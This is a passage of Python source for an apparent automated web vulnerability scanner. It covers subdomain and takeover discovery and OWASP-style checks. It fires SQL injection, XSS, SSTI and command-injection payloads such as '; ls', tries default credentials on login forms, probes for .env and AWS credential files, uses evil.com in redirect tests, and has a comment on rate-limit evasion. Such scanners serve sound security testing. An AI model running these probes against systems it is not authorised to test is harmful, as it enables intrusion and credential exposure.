                for entry in data[:50]:  # Limit to 50 entries
                    name = entry.get('name_value', '')
                    if name:
                        for sub in name.split('\n'):
                            if sub and sub.endswith(self.domain):
                                cert_subdomains.add(sub.lower())
                
                if cert_subdomains:
                    print(f"{SUCCESS} Found {len(cert_subdomains)} subdomains in certificate logs:")
                    for sub in list(cert_subdomains)[:10]:  # Show first 10
                        print(f"  {sub}")
                    
                    # Add new subdomains to our list
                    new_subs = [s for s in cert_subdomains if s not in self.subdomains]
                    self.subdomains.extend(new_subs)
                    
                    finding = Finding(
                        "Certificate Transparency Subdomains",
                        f"Found {len(cert_subdomains)} subdomains from SSL certificate logs",
                        RiskRating.INFO,
                        "Regularly monitor certificate logs for unauthorized certificate issuance",
                        "Subdomain"
                    )
                    self.report.add_finding(finding)
                    
        except Exception as e:
            print(f"{WARNING} Certificate transparency query failed: {str(e)}")
    
    def asn_discovery(self):
        """Discover ASN and associated IP ranges"""
        print(f"\n{INFO} ASN & IP Range Discovery")
        
        try:
            # Get IP of domain
            ip = socket.gethostbyname(self.domain)
            
            # Query for ASN information
            url = f"http://ip-api.com/json/{ip}"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data['status'] == 'success':
                    as_info = data.get('as', '')
                    print(f"{SUCCESS} ASN Information: {as_info}")
                    
                    if as_info:
                        asn = as_info.split()[0]  # Extract AS number
                        finding = Finding(
                            "ASN Information Discovered",
                            f"Target is hosted on {as_info}",
                            RiskRating.INFO,
                            "N/A - This is informational",
                            "Subdomain"
                        )
                        self.report.add_finding(finding)
                        
        except Exception as e:
            print(f"{WARNING} ASN discovery failed: {str(e)}")
    
    def check_takeover(self):
        """Check for subdomain takeover vulnerabilities"""
        print(f"\n{INFO} Checking for Subdomain Takeover Vulnerabilities")
        
        takeover_services = {
            'github.io': 'GitHub Pages',
            'herokuapp.com': 'Heroku',
            'amazonaws.com': 'AWS S3',
            'cloudfront.net': 'CloudFront',
            'azurewebsites.net': 'Azure',
            'trafficmanager.net': 'Azure Traffic Manager',
            'pantheonsite.io': 'Pantheon',
            'wordpress.com': 'WordPress.com',
            'unbouncepages.com': 'Unbounce',
            'surge.sh': 'Surge',
            'helpjuice.com': 'Helpjuice',
            'helpscoutdocs.com': 'Help Scout',
            'ghost.io': 'Ghost',
            'statuspage.io': 'StatusPage',
            'readme.io': 'Readme.io'
        }
        
        for subdomain in self.subdomains:
            try:
                # Check for CNAME records pointing to external services
                answers = dns.resolver.resolve(subdomain, 'CNAME')
                for cname in answers:
                    cname_str = str(cname).lower()
                    
                    for service_domain, service_name in takeover_services.items():
                        if service_domain in cname_str:
                            # Verify if service is actually claimed
                            try:
                                requests.get(f"http://{subdomain}", timeout=5, verify=False)
                                # Service responds - might be claimed
                                if self.verbose:
                                    print(f"{INFO} {subdomain} -> {service_name} (responds)")
                            except:
                                # Service doesn't respond - potential takeover
                                print(f"{V_HIGH} {subdomain} -> {service_name} (POTENTIAL TAKEOVER!)")
                                self.takeover_vulnerable.append({
                                    'subdomain': subdomain,
                                    'service': service_name,
                                    'cname': cname_str
                                })
                                
                                finding = Finding(
                                    "Subdomain Takeover Possible",
                                    f"{subdomain} has CNAME to {service_name} but service appears unclaimed",
                                    RiskRating.HIGH,
                                    f"Claim the service or remove the DNS record pointing to {service_name}",
                                    "Subdomain"
                                )
                                self.report.add_finding(finding)
                                
            except dns.resolver.NoAnswer:
                pass
            except Exception as e:
                if self.verbose:
                    print(f"{WARNING} Error checking {subdomain}: {str(e)}")
    
    def vhost_discovery(self):
        """Discover virtual hosts by sending Host header mutations"""
        print(f"\n{INFO} Virtual Host Discovery")
        
        try:
            # Try to discover IP of main domain
            ip = socket.gethostbyname(self.domain)
            
            # Common Host header mutations
            mutations = [
                self.domain,
                f"www.{self.domain}",
                f"admin.{self.domain}",
                f"dev.{self.domain}",
                f"test.{self.domain}",
                "localhost",
                ip,
                "127.0.0.1",
                "admin",
                "mail",
                "ftp"
            ]
            
            for mutation in mutations:
                try:
                    headers = {'Host': mutation}
                    response = requests.get(f"http://{ip}", headers=headers, timeout=5, verify=False)
                    
                    if response.status_code < 400:  # Valid response
                        if mutation != self.domain:
                            print(f"{SUCCESS} Potential vhost: {mutation} -> {response.status_code}")
                            
                            finding = Finding(
                                "Virtual Host Discovered",
                                f"Virtual host '{mutation}' resolves to {ip}",
                                RiskRating.INFO,
                                "Ensure all virtual hosts are properly configured and secured",
                                "Subdomain"
                            )
                            self.report.add_finding(finding)
                            
                except:
                    pass
                    
        except Exception as e:
            print(f"{WARNING} Virtual host discovery failed: {str(e)}")

# ==================== PHASE 3: WEB APPLICATION SCAN ====================
class WebScanner:
    """Phase 3: Web application security scanning"""
    
    def __init__(self, target, report, verbose=False):
        self.target = target if target.startswith(('http://', 'https://')) else f"http://{target}"
        self.report = report
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        self.forms = []
        self.links = []
        self.cookies = {}
        self.headers = {}
        self.tech_stack = []
        
        import random
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ]
        self.session.headers.update({"User-Agent": random.choice(user_agents)})
        self.error_baseline = ""
        
    def run(self):
        """Execute all web application scan phases"""
        print(f"\n{INFO} Starting Phase 3: Web Application Scan on {self.target}")
        
        # Information Gathering
        self.information_gathering()
        
        # OWASP A01: Broken Access Control
        self.check_access_control()
        
        # OWASP A02: Cryptographic Failures
        self.check_crypto_failures()
        
        # OWASP A03: Injection
        self.check_injection()
        
        # OWASP A04: Insecure Design
        self.check_insecure_design()
        
        # OWASP A05: Security Misconfiguration
        self.check_misconfiguration()
        
        # OWASP A06: Vulnerable Components
        self.check_vulnerable_components()
        
        # OWASP A07: Authentication Failures
        self.check_auth_failures()
        
        # OWASP A08: Integrity Failures
        self.check_integrity_failures()
        
        # OWASP A09: Logging Failures
        self.check_logging_failures()
        
        # OWASP A10: SSRF
        self.check_ssrf()
        
        # Additional Checks
        self.additional_checks()
        
        print(f"{SUCCESS} Phase 3 completed")
    
    def information_gathering(self):
        """Gather information about the web application"""
        print(f"\n{INFO} Information Gathering")
        
        try:
            # Baseline test for Soft-404 false positive prevention
            self.error_baseline = self.session.get(urljoin(self.target, f'/this-page-does-not-exist-{int(time.time())}.html'), timeout=5).text.lower()
        except:
            self.error_baseline = ""
            
        try:
            # Initial request
            response = self.session.get(self.target)
            self.headers = dict(response.headers)
            
            print(f"{SUCCESS} Target responds with status code: {response.status_code}")
            if response.status_code in [403, 406] and ('cloudflare' in response.text.lower() or 'akamai' in response.text.lower()):
                print(f"{WARNING} WAF Detected via Initial Request! Results may be limited or blocked.")
            
            # Detect CMS and Technology Stack
            self.detect_cms(response)
            
            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract forms
            self.forms = soup.find_all('form')
            print(f"{INFO} Found {len(self.forms)} forms")
            if self.forms:
                for i, form in enumerate(self.forms, 1):
                    action_val = form.get('action', 'Self/Empty')
                    id_val = form.get('id', 'No ID')
                    print(f"    --> [{i}] Action: {action_val} | ID: {id_val}")
            
            # Extract links
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href.startswith('http'):
                    self.links.append(href)
                elif href.startswith('/'):
                    self.links.append(urljoin(self.target, href))
            print(f"{INFO} Found {len(self.links)} unique links")
            
            # Check robots.txt
            self.check_robots()
            
            # Check sensitive files
            self.check_sensitive_files()
            
            # HTTP Headers analysis
            self.analyze_headers()
            
        except Exception as e:
            print(f"{WARNING} Information gathering failed: {str(e)}")
    
    def detect_cms(self, response):
        """Detect CMS and technology stack"""
        content = response.text.lower()
        headers = response.headers
        
        cms_signatures = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
            'Joomla': ['joomla', 'com_content', 'com_users'],
            'Drupal': ['drupal', 'sites/all', 'core/misc'],
            'Magento': ['magento', 'skin/frontend', 'js/varien'],
            'Shopify': ['shopify', 'cdn.shopify.com'],
            'Wix': ['wix.com', 'wixstatic.com'],
            'Squarespace': ['squarespace.com', 'static.squarespace'],
            'Ghost': ['ghost', 'ghost.org']
        }
        
        for cms, signatures in cms_signatures.items():
            for sig in signatures:
                if sig in content:
                    print(f"{SUCCESS} CMS Detected: {cms}")
                    self.tech_stack.append(cms)
                    
                    finding = Finding(
                        f"CMS Detected: {cms}",
                        f"The website appears to be running {cms}",
                        RiskRating.INFO,
                        "N/A - This is informational",
                        "Web"
                    )
                    self.report.add_finding(finding)
                    break
        
        # Detect server technology
        server = headers.get('Server', '')
        if server:
            print(f"{INFO} Server: {server}")
            self.tech_stack.append(server)
            
        # Detect programming language
        powered_by = headers.get('X-Powered-By', '')
        if powered_by:
            print(f"{INFO} Powered By: {powered_by}")
            self.tech_stack.append(powered_by)
    
    def check_robots(self):
        """Check robots.txt for sensitive paths"""
        try:
            robots_url = urljoin(self.target, '/robots.txt')
            response = self.session.get(robots_url)
            
            if response.status_code == 200:
                print(f"{V_MEDIUM} robots.txt found:")
                disallowed = []
                for line in response.text.split('\n'):
                    if line.lower().startswith('disallow'):
                        disallowed.append(line)
                        print(f"  {line}")
                
                if disallowed:
                    finding = Finding(
                        "Robots.txt Exposes Sensitive Paths",
                        "robots.txt contains Disallow directives that may reveal sensitive areas",
                        RiskRating.MEDIUM,
                        "Review robots.txt to ensure it doesn't expose sensitive information",
                        "Web"
                    )
                    for path in disallowed[:5]:
                        finding.add_evidence(path)
                    self.report.add_finding(finding)
                    
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} Could not check robots.txt: {str(e)}")
    
    def check_sensitive_files(self):
        """Check for exposed sensitive files"""
        sensitive_files = [
            '/.git/config', '/.env', '/.aws/credentials', 
            '/composer.json', '/package.json', '/requirements.txt',
            '/wp-config.php.bak', '/config.php.bak', '/.htaccess',
            '/.svn/entries', '/.DS_Store', '/crossdomain.xml',
            '/clientaccesspolicy.xml', '/phpinfo.php', '/info.php',
            '/.gitignore', '/.dockerignore', '/docker-compose.yml',
            '/.npmrc', '/.yarnrc', '/.bowerrc', '/Gemfile',
            '/Gemfile.lock', '/go.mod', '/build.gradle', '/pom.xml'
        ]
        
        for file_path in sensitive_files:
            try:
                time.sleep(0.1)  # Simple rate limit evasion
                url = urljoin(self.target, file_path)
                response = self.session.get(url)
                
                if response.status_code == 200:
                    content_lower = response.text.lower()
                    if content_lower and content_lower != self.error_baseline:
                        # Validate the content against basic signatures
                        is_valid = False
                        if 'git' in file_path and '[core]' in content_lower: is_valid = True
                        elif 'env' in file_path and '=' in content_lower: is_valid = True
                        elif 'json' in file_path and '{' in content_lower: is_valid = True
                        elif 'docker' in file_path and ('from ' in content_lower or 'image:' in content_lower): is_valid = True
                        elif 'xml' in file_path and '<?xml' in content_lower: is_valid = True
                        elif '<html' not in content_lower: is_valid = True
                        
                        if is_valid:
                            print(f"{V_HIGH} Sensitive file exposed: {file_path}")
                            
                            finding = Finding(
                                f"Sensitive File Exposed: {file_path}",
                                f"The file {file_path} is publicly accessible",
                                RiskRating.HIGH,
                                f"Restrict access to {file_path} and remove it from the web root",
                                "Web"
                            )
                            self.report.add_finding(finding)
                            
            except:
                pass
    
    def analyze_headers(self):
        """Analyze HTTP headers for security issues"""
        security_headers = {
            'Strict-Transport-Security': {
                'desc': 'HSTS header missing',
                'risk': RiskRating.MEDIUM,
                'remediation': 'Implement HSTS to enforce HTTPS connections'
            },
            'Content-Security-Policy': {
                'desc': 'CSP header missing',
                'risk': RiskRating.MEDIUM,
                'remediation': 'Implement CSP to mitigate XSS and data injection attacks'
            },
            'X-Content-Type-Options': {
                'desc': 'X-Content-Type-Options header missing',
                'risk': RiskRating.LOW,
                'remediation': 'Set X-Content-Type-Options: nosniff'
            },
            'X-Frame-Options': {
                'desc': 'X-Frame-Options header missing',
                'risk': RiskRating.MEDIUM,
                'remediation': 'Set X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking'
            },
            'X-XSS-Protection': {
                'desc': 'X-XSS-Protection header missing',
                'risk': RiskRating.LOW,
                'remediation': 'Set X-XSS-Protection: 1; mode=block'
            },
            'Referrer-Policy': {
                'desc': 'Referrer-Policy header missing',
                'risk': RiskRating.LOW,
                'remediation': 'Implement Referrer-Policy header'
            },
            'Permissions-Policy': {
                'desc': 'Permissions-Policy header missing',
                'risk': RiskRating.LOW,
                'remediation': 'Implement Permissions-Policy header'
            }
        }
        
        for header, info in security_headers.items():
            if header not in self.headers:
                print(f"{RiskRating.marker(info['risk'])} Missing security header: {header}")
                
                finding = Finding(
                    f"Missing Security Header: {header}",
                    info['desc'],
                    info['risk'],
                    info['remediation'],
                    "Web"
                )
                self.report.add_finding(finding)
    
    def check_access_control(self):
        """Check for broken access control issues"""
        print(f"\n{INFO} Checking for Broken Access Control")
        
        # Check for directory listing
        common_dirs = ['/images/', '/css/', '/js/', '/uploads/', '/backup/', '/temp/']
        
        for directory in common_dirs:
            try:
                url = urljoin(self.target, directory)
                response = self.session.get(url)
                
                if response.status_code == 200:
                    # Check if directory listing is enabled
                    if 'Index of' in response.text:
                        print(f"{V_HIGH} Directory listing enabled: {directory} (Status: {response.status_code})")
                        
                        finding = Finding(
                            "Directory Listing Enabled",
                            f"Directory listing is enabled at {directory}",
                            RiskRating.HIGH,
                            "Disable directory listing in web server configuration",
                            "Web"
                        )
                        self.report.add_finding(finding)
            except:
                pass
        
        # Check for admin panels
        for admin_panel in ADMIN_PANELS:
            try:
                time.sleep(0.1)
                url = urljoin(self.target, admin_panel)
                response = self.session.get(url)
                
                if response.status_code == 200:
                    content_lower = response.text.lower()
                    if content_lower != self.error_baseline:
                        # Additional validation specifically for an admin panel looking form
                        if '<input' in content_lower and ('password' in content_lower or 'type="password"' in content_lower or 'login' in content_lower):
                            print(f"{V_HIGH} Admin panel accessible: {admin_panel} (Status: {response.status_code})")
                            
                            finding = Finding(
                                "Admin Panel Exposed",
                                f"Admin panel accessible at {admin_panel}",
                                RiskRating.HIGH,
                                "Restrict access to admin panels by IP or implement additional authentication",
                                "Web"
                            )
                            self.report.add_finding(finding)
            except:
                pass
        
        # Check for HTTP verb tampering
        dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'OPTIONS', 'PATCH']
        
        for method in dangerous_methods:
            try:
                time.sleep(0.1)
                if method in ['PUT', 'DELETE']:
                    test_url = urljoin(self.target, f'/test-{int(time.time())}.txt')
                    response = self.session.request(method, test_url)
                    if response.status_code in [200, 201, 204]:
                        print(f"{V_HIGH} HTTP method {method} is allowed! (Status: {response.status_code})")
                        finding = Finding(
                            f"Dangerous HTTP Method Allowed: {method}",
                            f"The server allows {method} requests which could lead to security issues via file creation/deletion",
                            RiskRating.HIGH,
                            f"Disable {method} method or restrict its usage",
                            "Web"
                        )
                        self.report.add_finding(finding)
                else:
                    response = self.session.request(method, self.target)
                    
                    if response.status_code not in [405, 501, 403, 404]:  # Method not allowed/not implemented
                        print(f"{V_HIGH} HTTP method {method} is allowed! (Status: {response.status_code})")
                        
                        finding = Finding(
                            f"Dangerous HTTP Method Allowed: {method}",
                            f"The server allows {method} requests which could lead to security issues",
                            RiskRating.HIGH,
                            f"Disable {method} method or restrict its usage",
                            "Web"
                        )
                        self.report.add_finding(finding)
            except:
                pass
    
    def check_crypto_failures(self):
        """Check for cryptographic failures"""
        print(f"\n{INFO} Checking for Cryptographic Failures")
        
        # Check if HTTPS is used
        if not self.target.startswith('https'):
            print(f"{V_HIGH} Website does not use HTTPS")
            
            finding = Finding(
                "HTTPS Not Enforced",
                "The website is accessible over HTTP without HTTPS",
                RiskRating.HIGH,
                "Implement HTTPS and redirect all HTTP traffic to HTTPS",
                "Web"
            )
            self.report.add_finding(finding)
        
        # Check for mixed content
        if self.target.startswith('https'):
            try:
                response = self.session.get(self.target)
                if 'http://' in response.text:
                    print(f"{V_MEDIUM} Mixed content detected (HTTP resources on HTTPS page)")
                    
                    finding = Finding(
                        "Mixed Content Detected",
                        "HTTPS page loads resources over HTTP",
                        RiskRating.MEDIUM,
                        "Ensure all resources are loaded over HTTPS",
                        "Web"
                    )
                    self.report.add_finding(finding)
            except:
                pass
        
        # Check SSL/TLS configuration
        try:
            hostname = urlparse(self.target).hostname
            port = 443
            
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiration
                    not_after = cert['notAfter']
                    expiry_date = datetime.datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                    days_until_expiry = (expiry_date - datetime.datetime.now()).days
                    
                    if days_until_expiry < 30:
                        print(f"{V_HIGH} SSL certificate expires in {days_until_expiry} days")
                        
                        finding = Finding(
                            "SSL Certificate Expiring Soon",
                            f"Certificate expires in {days_until_expiry} days",
                            RiskRating.HIGH,
                            "Renew the SSL certificate before expiration",
                            "Web"
                        )
                        self.report.add_finding(finding)
                    
                    # Check TLS version
                    tls_version = ssock.version()
                    if tls_version in ['TLSv1', 'TLSv1.1']:
                        print(f"{V_MEDIUM} Using outdated TLS version: {tls_version}")
                        
                        finding = Finding(
                            "Outdated TLS Version",
                            f"Server supports {tls_version} which is deprecated",
                            RiskRating.MEDIUM,
                            "Disable TLS 1.0 and 1.1, use TLS 1.2 or 1.3",
                            "Web"
                        )
                        self.report.add_finding(finding)
                        
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} SSL/TLS check failed: {str(e)}")
    
    def check_injection(self):
        """Check for injection vulnerabilities"""
        print(f"\n{INFO} Testing for Injection Vulnerabilities")
        
        # Find all input parameters from forms and URLs
        parameters = set()
        
        # Extract parameters from forms
        for form in self.forms:
            inputs = form.find_all('input')
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    parameters.add(name)
        
        # Extract parameters from URL
        parsed = urlparse(self.target)
        if parsed.query:
            for param in parse_qs(parsed.query):
                parameters.add(param)
        
        print(f"{INFO} Testing {len(parameters)} parameters for injection")
        
        # SQL Injection testing
        for param in parameters:
            for payload in SQLI_PAYLOADS[:5]:  # Test first 5 payloads for efficiency
                try:
                    # Test GET parameters
                    test_url = f"{self.target}?{param}={payload}"
                    response = self.session.get(test_url)
                    
                    # Check for SQL errors
                    sql_errors = [
                        "sql", "mysql", "sqlite", "postgresql",
                        "odbc", "driver", "db error",
                        "warning: mysql", "unclosed quotation mark",
                        "you have an error in your sql"
                    ]
                    
                    response_text = response.text.lower()
                    if any(error in response_text for error in sql_errors):
                        print(f"{V_CRITICAL} Possible SQL Injection in parameter: {param}")
                        
                        finding = Finding(
                            "SQL Injection Vulnerability",
                            f"Parameter '{param}' appears vulnerable to SQL injection",
                            RiskRating.CRITICAL,
                            "Use parameterized queries/prepared statements. Implement input validation.",
                            "Web"
                        )
                        finding.add_evidence(f"Payload: {payload}")
                        self.report.add_finding(finding)
                        break
                        
                except:
                    pass
        
        # XSS Testing
        for param in parameters:
            for payload in XSS_PAYLOADS[:3]:  # Test first 3 payloads
                try:
                    test_url = f"{self.target}?{param}={payload}"
                    response = self.session.get(test_url)
                    
                    if payload in response.text and '<script>' in payload:
                        print(f"{V_CRITICAL} Possible XSS in parameter: {param}")
                        
                        finding = Finding(
                            "Cross-Site Scripting (XSS) Vulnerability",
                            f"Parameter '{param}' reflects input without proper encoding",
                            RiskRating.CRITICAL,
                            "Implement proper output encoding and Content-Security-Policy",
                            "Web"
                        )
                        finding.add_evidence(f"Payload: {payload}")
                        self.report.add_finding(finding)
                        break
                        
                except:
                    pass
        
        # Command Injection Testing (Time-Based & Output-Based)
        cmd_payloads = ['; ls', '| ls', '|| ls', '&& ls', '`ls`', '$(ls)', '; sleep 5', '| sleep 5', '|| sleep 5', '`sleep 5`']
        
        for param in parameters:
            for payload in cmd_payloads:
                try:
                    time.sleep(0.1)
                    test_url = f"{self.target}?{param}={payload}"
                    
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=10)
                    elapsed_time = time.time() - start_time
                    
                    # Check for command output in response
                    cmd_indicators = ['root:', 'bin:', 'boot:', 'etc:', 'home:', 'var:']
                    output_injected = any(indicator in response.text for indicator in cmd_indicators)
                    
                    if output_injected or (elapsed_time > 4.5 and 'sleep' in payload):
                        # Use a more accurate warning for time-based vs output-based
                        vuln_detail = "Time-Based OS Command Injection detected" if elapsed_time > 4.5 else "OS Command Injection detected via output"
                        print(f"{V_CRITICAL} Possible {vuln_detail} in parameter: {param}")
                        
                        finding = Finding(
                            "OS Command Injection Vulnerability",
                            f"Parameter '{param}' executes commands directly on the server OS.",
                            RiskRating.CRITICAL,
                            "Avoid system calls with user input. Use proper input validation and sanitization.",
                            "Web"
                        )
                        finding.add_evidence(f"Payload: {payload}")
                        self.report.add_finding(finding)
                        break
                        
                except requests.exceptions.Timeout:
                    if 'sleep' in payload:
                        print(f"{V_CRITICAL} Possible Time-based Command Injection (Timeout) in parameter: {param}")
                        finding = Finding(
                            "Time-Based Command Injection Vulnerability",
                            f"Parameter '{param}' caused a server timeout, likely executing: {payload}",
                            RiskRating.CRITICAL,
                            "Avoid system calls safely",
                            "Web"
                        )
                        finding.add_evidence(f"Payload: {payload}")
                        self.report.add_finding(finding)
                        break
                except:
                    pass
        
        # Server-Side Template Injection (SSTI) Testing
        print(f"\n{INFO} Testing parameters for SSTI")
        ssti_payloads = ['{{7*7}}', '${7*7}', '<% 7*7 %>', '#{7*7}', '[[7*7]]']
        for param in parameters:
            for payload in ssti_payloads:
                try:
                    time.sleep(0.1)
                    test_url = f"{self.target}?{param}={payload}"
                    response = self.session.get(test_url)
                    
                    # Since 7*7 is 49, if the evaluated mathematical formula evaluates to 49 
                    # while the payload input itself vanished, SSTI is highly probable.
                    if '49' in response.text and payload not in response.text:
                        print(f"{V_CRITICAL} Server-Side Template Injection in parameter: {param}")
                        
                        finding = Finding(
                            "Server-Side Template Injection",
                            f"Parameter '{param}' is evaluated dynamically within an insecure template environment.",
                            RiskRating.CRITICAL,
                            "Use a strictly structured, non-executable templating engine configuration. Do not pass user input directly into generic templating parsers.",
                            "Web"
                        )
                        finding.add_evidence(f"Executed Mathematical Payload: {payload} rendered as 49")
                        self.report.add_finding(finding)
                        break
                except:
                    pass
    
    def check_insecure_design(self):
        """Check for insecure design flaws"""
        print(f"\n{INFO} Checking for Insecure Design")
        
        # Check for debug endpoints
        debug_endpoints = [
            '/debug', '/debug/', '/trace', '/trace/',
            '/actuator', '/actuator/health', '/actuator/info',
            '/swagger', '/swagger-ui', '/api-docs', '/v2/api-docs',
            '/graphql', '/graphiql', '/console', '/h2-console',
            '/phpinfo.php', '/info.php', '/test.php', '/.git'
        ]
        
        for endpoint in debug_endpoints:
            try:
                url = urljoin(self.target, endpoint)
                response = self.session.get(url)
                
                if response.status_code == 200:
                    print(f"{V_HIGH} Debug endpoint exposed: {endpoint}")
                    
                    finding = Finding(
                        "Debug Endpoint Exposed",
                        f"Sensitive debug/information endpoint accessible at {endpoint}",
                        RiskRating.HIGH,
                        "Remove or restrict access to debug endpoints in production",
                        "Web"
                    )
                    self.report.add_finding(finding)
            except:
                pass
    
    def check_misconfiguration(self):
        """Check for security misconfigurations"""
        print(f"\n{INFO} Checking for Security Misconfigurations")
        
        # Check for default credentials
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('user', 'user'),
            ('test', 'test'),
            ('guest', 'guest')
        ]
        
        # Find login forms
        for form in self.forms:
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            
            if 'login' in action.lower() or 'login' in str(form).lower():
                # Try default credentials
                for username, password in default_creds:
                    try:
                        if method == 'post':
                            data = {'username': username, 'password': password, 'login': 'submit'}
                            # Adjust field names based on common patterns
                            for input_tag in form.find_all('input'):
                                name = input_tag.get('name', '')
                                if 'user' in name.lower():
                                    data[name] = username
                                elif 'pass' in name.lower():
                                    data[name] = password
                            
                            response = self.session.post(urljoin(self.target, action), data=data)
                        else:
                            params = {'username': username, 'password': password}
                            response = self.session.get(urljoin(self.target, action), params=params)
                        
                        # Check if login successful (based on response)
                        if response.status_code == 200 and ('welcome' in response.text.lower() or 'dashboard' in response.text.lower()):
                            print(f"{V_CRITICAL} Default credentials working: {username}/{password}")
                            
                            finding = Finding(
                                "Default Credentials Working",
                                f"Login form accepts default credentials: {username}/{password}",
                                RiskRating.CRITICAL,
                                "Change all default credentials immediately. Implement account lockout policies.",
                                "Web"
                            )
                            self.report.add_finding(finding)
                            break
                            
                    except:
                        pass
        
        # Check for CORS misconfiguration
        try:
            headers = {
                'Origin': 'https://evil.com',
                'Host': urlparse(self.target).hostname
            }
            response = self.session.options(self.target, headers=headers)
            
            if 'access-control-allow-origin' in response.headers:
                if response.headers['access-control-allow-origin'] == '*':
                    print(f"{V_MEDIUM} CORS misconfiguration: Wildcard origin allowed")
                    
                    finding = Finding(
                        "CORS Misconfiguration",
                        "Server allows wildcard origin with credentials, which is insecure",
                        RiskRating.MEDIUM,
                        "Restrict CORS to specific trusted domains only",
                        "Web"
                    )
                    self.report.add_finding(finding)
                    
        except:
            pass
        
        # Check for open redirects
        redirect_params = ['redirect', 'url', 'next', 'return', 'returnUrl', 'return_to', 'goto']
        
        for param in redirect_params:
            try:
                test_url = f"{self.target}?{param}=https://evil.com"
                response = self.session.get(test_url, allow_redirects=False)
                
                if response.status_code in [301, 302] and 'evil.com' in response.headers.get('Location', ''):
                    print(f"{V_MEDIUM} Open redirect vulnerability in parameter: {param}")
                    
                    finding = Finding(
                        "Open Redirect Vulnerability",
                        f"Parameter '{param}' allows redirect to arbitrary external domains",
                        RiskRating.MEDIUM,
                        "Validate and whitelist redirect URLs. Avoid using user input for redirects.",
                        "Web"
                    )
                    self.report.add_finding(finding)
            except:
                pass
    
    def check_vulnerable_components(self):
        """Check for vulnerable components"""
        print(f"\n{INFO} Checking for Vulnerable Components")
        
        # Check for exposed dependency files
        dep_files = [
            '/package.json', '/composer.json', '/requirements.txt',
            '/Gemfile.lock', '/yarn.lock', '/package-lock.json',
            '/pom.xml', '/build.gradle', '/go.mod', '/Cargo.toml'
        ]
        
        for dep_file in dep_files:
            try:
                url = urljoin(self.target, dep_file)
                response = self.session.get(url)
                
                if response.status_code == 200:
                    print(f"{V_MEDIUM} Dependency file exposed: {dep_file}")
                    
                    finding = Finding(
                        f"Dependency File Exposed: {dep_file}",
                        f"The file {dep_file} reveals application dependencies",
                        RiskRating.MEDIUM,
                        f"Restrict access to {dep_file} or move it outside the web root",
                        "Web"
                    )
                    self.report.add_finding(finding)
            except:
                pass
        
        # Detect jQuery version
        try:
            response = self.session.get(self.target)
            jquery_matches = re.findall(r'jquery[/-]?([\d.]+)(?:\.min)?\.js', response.text, re.I)
            
            if jquery_matches:
                jquery_version = jquery_matches[0]
                print(f"{INFO} jQuery version detected: {jquery_version}")
                
                # Check for vulnerable versions
                vulnerable_versions = {
                    '<1.9.0': ['CVE-2012-6708', 'XSS vulnerability'],
                    '<1.12.0': ['CVE-2015-9251', 'XSS vulnerability'],
                    '<3.0.0': ['CVE-2016-7103', 'XSS vulnerability']
                }
                
                for version_range, vuln_info in vulnerable_versions.items():
                    if jquery_version < version_range.replace('<', ''):
                        print(f"{V_MEDIUM} jQuery version {jquery_version} may be vulnerable")
                        
                        finding = Finding(
                            "Vulnerable jQuery Version",
                            f"jQuery {jquery_version} has known vulnerabilities: {', '.join(vuln_info)}",
                            RiskRating.MEDIUM,
                            "Update jQuery to the latest secure version",
                            "Web"
                        )
                        self.report.add_finding(finding)
                        break
        except:
            pass
    
    def check_auth_failures(self):
        """Check for authentication failures"""
        print(f"\n{INFO} Checking for Authentication Failures")
        
        # Check session cookie security
        if self.session.cookies:
            for cookie in self.session.cookies:
                issues = []
                
                if not cookie.secure:
                    issues.append("Missing Secure flag")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append("Missing HttpOnly flag")
                if not cookie.domain_specified:
                    issues.append("Domain not specified")
                
                if issues:
                    print(f"{V_MEDIUM if 'HttpOnly' in str(issues) else V_LOW} Cookie '{cookie.name}' has security issues: {', '.join(issues)}")
                    
                    finding = Finding(
                        "Insecure Session Cookie",
                        f"Cookie '{cookie.name}' lacks security flags: {', '.join(issues)}",
                        RiskRating.MEDIUM if 'HttpOnly' in str(issues) else RiskRating.LOW,
                        "Set Secure, HttpOnly flags and proper domain/path for session cookies",
                        "Web"
                    )
                    self.report.add_finding(finding)
        
        # Check for login forms and test Auth Bypass techniques
        for form in self.forms:
            form_str = str(form).lower()
            if 'login' in form_str or 'signin' in form_str or 'password' in form_str:
                form_action = urljoin(self.target, form.get('action', ''))
                
                # 1. Missing anti-CSRF token check on login
                if 'csrf' not in form_str and 'authenticity_token' not in form_str and 'token' not in form_str:
                    print(f"{V_MEDIUM} Login form missing anti-CSRF token")
                    finding = Finding("Missing Anti-CSRF Token on Login", "The login form appears to lack an unpredictable anti-CSRF token.", RiskRating.MEDIUM, "Implement unpredictable anti-CSRF tokens for all state-changing requests, including login forms.", "Web")
                    self.report.add_finding(finding)
                
                try:
                    # 2. Test for Username Enumeration via responses
                    data1 = {'username': 'nonexistentuser123456', 'password': 'wrongpass1'}
                    response1 = self.session.post(form_action, data=data1)
                    
                    data2 = {'username': 'admin', 'password': 'wrongpass2'}
                    response2 = self.session.post(form_action, data=data2)
                    
                    if response1.text != response2.text:
                        print(f"{V_MEDIUM} Possible username enumeration detected via error message diff")
